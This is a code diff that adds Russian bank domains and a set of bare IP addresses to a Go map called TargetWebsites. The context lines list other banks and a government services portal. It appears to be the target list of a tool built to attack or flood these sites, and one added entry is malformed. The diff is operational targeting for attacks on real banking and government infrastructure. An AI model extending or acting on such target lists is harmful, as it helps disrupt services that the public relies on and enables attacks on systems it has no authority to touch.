@@ -203,6 +203,17 @@ var TargetWebsites = map[string]struct{}{
 	"https://online.rshb.ru":                            {},
 	"https://online.sovcombank.ru":                      {},
 	"https://online.mkb.ru":                             {},
+	"https://www.tinkoff.ru":                            {},
+	"http://178.248.236.218":                            {},
+	"http://92.223.84.84 80":                            {},
+	"http://91.194.226.50":                              {},
+	"http://78.46.94.184":                               {},
+	"http://46.4.106.111":                               {},
+	"https://auth.tcsbank.ru":                           {},  
+	"http://91.194.226.32":                              {},
+	"http://91.194.226.22":                              {},
+	"http://91.194.226.15":                              {},
+	"http://91.194.226.6":                               {},
 
 	//The state
 	"https://gosuslugi.ru":           {},
